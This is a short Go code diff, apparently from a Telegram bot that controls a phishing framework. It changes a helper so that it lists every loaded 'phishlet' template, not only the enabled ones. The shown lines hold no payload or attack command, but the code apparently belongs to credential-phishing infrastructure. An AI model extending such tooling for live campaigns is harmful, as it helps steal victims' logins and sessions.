@@ -39,19 +39,11 @@ func (b *TelegramBot) popPendingPhishlet(chatId int64) string {
 	return p
 }
 
-// availablePhishlets returns names of all enabled phishlets.
+// availablePhishlets returns names of all loaded phishlets.
 func (b *TelegramBot) availablePhishlets() []string {
 	var names []string
 	for name := range b.cfg.phishlets {
-		if b.cfg.IsSiteEnabled(name) {
-			names = append(names, name)
-		}
-	}
-	// If none enabled, return all loaded ones
-	if len(names) == 0 {
-		for name := range b.cfg.phishlets {
-			names = append(names, name)
-		}
+		names = append(names, name)
 	}
 	return names
 }
